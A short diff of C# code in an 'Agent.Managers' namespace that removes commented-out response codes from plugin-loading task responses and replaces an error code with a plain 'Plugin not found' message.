@@ -44,7 +44,6 @@ namespace Agent.Managers
                                 LoadTaskResponse cr = new LoadTaskResponse()
                                 {
                                     completed = true,
-                                    //process_response = new Dictionary<string, string> { { "message", "0x1D" } },
                                     user_output = $"Loaded plugin {loadCommand.command}",
                                     task_id = job.task.id,
                                     commands = new List<CommandsResponse>()
@@ -63,7 +62,6 @@ namespace Agent.Managers
                                 LoadTaskResponse cr = new LoadTaskResponse()
                                 {
                                     completed = true,
-                                    //process_response = new Dictionary<string, string> { { "message", "0x1D" } },
                                     user_output = $"Failed to load plugin {loadCommand.command}",
                                     task_id = job.task.id,
                                     commands = new List<CommandsResponse>()
@@ -92,7 +90,7 @@ namespace Agent.Managers
                             await this.messageManager.AddResponse(new TaskResponse()
                             {
                                 task_id = job.task.id,
-                                process_response = new Dictionary<string, string> { { "message", "0x11" } },
+                                user_output = "Plugin not found. Please load it.",
                                 status = "error",
                                 completed = true,
                             });
